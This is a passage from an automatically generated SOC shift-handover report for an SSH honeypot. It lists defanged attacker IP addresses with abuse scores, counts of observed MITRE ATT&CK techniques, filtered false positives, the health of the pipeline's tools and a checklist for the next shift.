| `119.200.229[.]33` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `120.48.29[.]51` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 24 |
| `101.126.55[.]67` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `80.71.227[.]151` | NL | SpaceCore.pro Hosting | **100** ⚠️ | 0 |
| `38.137.11[.]14` | IN | Netplus Broadband Services Pvt ltd | **100** ⚠️ | 34 |
| `134.199.171[.]191` | AU | DigitalOcean, LLC | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 80 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 44 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 97 cases |
| Tool 34  | Credential Extractor        | ✅ 58 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 0 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (7.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 9 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 25 recon entry/entries in table (8 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-16T02:35:00Z_
